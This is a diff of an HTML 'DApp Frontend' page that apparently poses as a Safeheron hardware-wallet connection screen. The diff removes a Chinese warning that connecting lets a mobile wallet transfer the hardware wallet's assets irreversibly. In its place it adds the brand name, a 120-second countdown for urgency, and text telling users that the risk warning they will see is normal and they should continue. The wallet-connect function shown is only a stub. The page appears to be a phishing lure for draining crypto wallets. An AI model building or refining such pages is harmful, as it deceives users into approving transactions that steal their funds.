@@ -4,59 +4,46 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DApp Frontend</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #f5f5f5;
-            margin: 0;
-            padding: 10px;
-        }
-        h1 {
-            color: #333;
-        }
-        .button-container {
-            margin-top: 20px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            transition: background-color 0.3s ease;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .warning {
-            margin-top: 30px;
-            padding: 20px;
-            background-color: #ffebeb;
-            border: 1px solid #f5c6cb;
-            border-radius: 5px;
-            color: #a94442;
-            max-width: 100%;
-            text-align: center;
-        }
-    </style>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h1>正在连接硬件钱包</h1>
-    <div class="button-container">
-        <button id="okButton" onclick="connectWallet()">OK</button>
-    </div>
-    <div class="warning">
-        注意！你正在用应急方式连接你的硬件钱包一旦连接<br>
-        硬件钱包中的资产可由手机钱包转走这是不可逆的
+    <div class="container">
+        <h1>准备连接Safeheron硬件钱包</h1>
+        <div class="progress-bar">
+            <div id="progress"></div>
+        </div>
+        <div class="countdown" id="countdown">120秒后请重新连接</div>
+        <h2>Safeheron Wallet</h2>
+        <div class="button-container">
+            <button id="okButton" onclick="connectWallet()">OK</button>
+        </div>
+        <div class="warning">
+连接手机钱包会出现风险提示这是正常的请继续
+        </div>
     </div>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
-    <script src="script.js"></script>
+    <script>
+        function connectWallet() {
+            console.log("Connecting wallet...");
+        }
+
+        let countdown = 120;
+        const countdownElement = document.getElementById('countdown');
+        const progressElement = document.getElementById('progress');
+
+        function updateCountdown() {
+            countdown--;
+            countdownElement.textContent = `${countdown}秒后请重新连接`;
+            progressElement.style.width = `${(120 - countdown) / 120 * 100}%`;
+
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                countdownElement.textContent = "请重新连接";
+                progressElement.style.width = "100%";
+            }
+        }
+
+        const countdownInterval = setInterval(updateCountdown, 1000);
+    </script>
 </body>
 </html>
